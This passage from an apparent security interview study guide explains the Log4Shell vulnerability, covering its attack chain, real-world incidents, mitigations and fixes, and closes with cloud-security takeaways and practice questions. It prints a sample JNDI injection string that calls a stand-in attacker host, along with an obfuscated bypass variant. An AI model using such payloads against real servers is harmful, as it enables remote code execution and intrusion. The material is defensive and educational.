The vulnerability was assigned a CVSS score of 10.0 (the maximum) due to its trivial exploitability, widespread impact, and the fact that it requires no authentication.

### How It Works

1. **Injection:** The attacker sends a crafted string containing a JNDI lookup expression to any input that gets logged by the vulnerable application. This could be a User-Agent header, a form field, a chat message, a search query -- anything the application logs.
   ```
   ${jndi:ldap://attacker.com:1389/exploit}
   ```

2. **Log processing:** Log4j 2.x processes the log message and encounters the `${jndi:...}` expression. The message lookup substitution feature evaluates this as a JNDI lookup.

3. **JNDI resolution:** Log4j performs a JNDI lookup to the attacker-controlled LDAP (or RMI/DNS) server.

4. **Malicious response:** The attacker's LDAP server responds with a reference to a remote Java class file (hosted on an HTTP server the attacker controls).

5. **Class loading:** The vulnerable application downloads and instantiates the malicious Java class, executing the attacker's code (e.g., a reverse shell, a crypto miner, or ransomware payload).

6. **Post-exploitation:** The attacker has RCE with the privileges of the Java application, which often runs as root or a service account with broad permissions.

### Real-World Example

Log4Shell was publicly disclosed on December 9, 2021, and exploitation began within hours. The impact was enormous because Log4j is embedded in thousands of Java applications, frameworks, and products:

- **Minecraft servers** were among the first targets, with attackers sending exploit strings in chat messages.
- **Belgian Ministry of Defence** confirmed a breach through Log4Shell exploitation in December 2021.
- **VMware Horizon and vCenter** were widely targeted, with multiple ransomware groups (Conti, Night Sky, AvosLocker) using Log4Shell as an initial access vector.
- **CISA** issued Emergency Directive 22-02 requiring all federal agencies to patch or mitigate within days.
- **The vulnerability cascade continued:** CVE-2021-45046 (bypass of initial fix), CVE-2021-45105 (denial of service), and CVE-2021-44832 (RCE via configuration) followed in rapid succession.

### Security Implications

- **Supply chain risk:** Log4j is a transitive dependency in countless Java applications. Many organisations did not even know they were using it. This highlighted the critical need for Software Bill of Materials (SBOM) and dependency tracking.
- **Defence in depth matters:** Organisations with egress filtering (blocking outbound LDAP/RMI connections) were partially protected even before patching. Network segmentation limited lateral movement post-exploitation.
- **Patching complexity:** Simply updating Log4j was not always straightforward because it is often bundled inside application JARs (shaded/fat JARs). Tools like `log4j-scan` and Syft/Grype were needed to find all instances.
- **Mitigations (before patching):**
  - Set `log4j2.formatMsgNoLookups=true` (Java system property).
  - Remove the `JndiLookup` class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
  - Block outbound LDAP, RMI, and DNS traffic from application servers.
  - Use a WAF rule to detect and block JNDI lookup patterns (note: attackers quickly developed obfuscation bypasses such as `${${lower:j}ndi:...}`).
- **Fix:** Upgrade to Log4j 2.17.1 or later, which disables JNDI lookups by default and removes the vulnerable message lookup functionality.

### Interview Tip

Log4Shell is an excellent example to discuss in interviews because it touches supply chain security, defence in depth, vulnerability management, and incident response. Explain the full kill chain: injection to JNDI lookup to class loading to RCE. Mention that it was especially devastating because (1) the attack payload can be injected in any logged input, (2) Log4j is everywhere in the Java ecosystem, and (3) exploitation is trivially simple. When discussing defences, emphasise that egress filtering and SBOM practices would have significantly reduced the blast radius.

### References

- CVE-2021-44228: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html
- Lunasec Log4Shell analysis: https://www.lunasec.io/docs/blog/log4j-zero-day/
- CISA Log4j guidance: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
- Swiss Government CERT Log4j overview: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

---

## Key Takeaways

1. **Hypervisors are the foundation of cloud security.** Type 1 hypervisors (bare-metal) provide stronger isolation than Type 2 (hosted), but a vulnerability at the hypervisor level is catastrophic because there is no lower layer to protect tenants.

2. **Containers share the kernel; VMs do not.** This single difference defines the security boundary strength. Containers are not a security boundary on their own -- use sandboxed runtimes (gVisor, Kata Containers) for untrusted workloads.

3. **Cloud lateral movement is identity-driven.** Service accounts, IAM misconfigurations, and metadata services are the primary attack vectors. The principle of least privilege for IAM is the most important cloud security control.

4. **Side-channel attacks are a hardware-level threat.** Spectre and Meltdown demonstrated that CPU performance optimisations can create security vulnerabilities that require mitigations across the entire stack -- hardware, OS, compiler, and application.

5. **Zero trust (BeyondCorp) eliminates the network as a trust boundary.** Access decisions are based on user identity, device posture, and context -- not network location. This model is resilient to network-level compromises and supports modern remote work.

6. **Supply chain vulnerabilities (Log4Shell) have outsized impact.** A single vulnerability in a widely-used library can affect millions of systems. SBOM, dependency scanning, egress filtering, and defence in depth are essential.

7. **Defence in depth is the common thread.** Every topic in this section reinforces the same principle: no single control is sufficient. Layer your defences across hardware, hypervisor, OS, runtime, network, identity, and application.

## Interview Practice Questions

1. **Explain the difference between Type 1 and Type 2 hypervisors. Which would you recommend for a production cloud environment and why?**

2. **A container running in your Kubernetes cluster has been compromised. Walk through the potential attack paths an adversary could take. What controls would limit the blast radius?**

3. **Describe how an attacker could use the instance metadata service to escalate privileges in AWS. What defences would you implement?**

4. **Explain Spectre to a software engineer who has never heard of it. How does Site Isolation in Chrome mitigate this class of attacks?**

5. **Your organisation currently relies on a VPN for remote access. Make the case for migrating to a BeyondCorp / zero-trust model. What are the challenges?**

6. **You are responding to a Log4Shell incident. Your organisation has hundreds of Java services. Walk through your response plan from detection to remediation.**

7. **What is the difference between a VM escape and a container escape? Which is more likely in practice, and why?**

8. **An attacker has obtained a GCP service account key from a public GitHub repository. Describe the steps they might take and how you would detect and respond to this incident.**

9. **How would you design a multi-tenant cloud architecture that is resilient to both network-based attacks and side-channel attacks?**

10. **Explain hyperjacking. Why is it difficult to detect, and what hardware features help prevent it?**

---

[Previous: Web Application](web-application.md) | [Next: OS Implementation & Systems](os-systems.md)
